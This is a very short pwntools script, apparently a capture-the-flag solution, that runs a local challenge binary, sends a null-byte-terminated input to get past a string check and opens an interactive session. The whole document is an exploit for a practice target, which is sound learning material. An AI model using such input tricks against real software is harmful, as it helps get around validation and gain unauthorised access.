from pwn import *

p = process('./chall_09')

payload = b'Th\0'
p.sendline(payload)
p.interactive()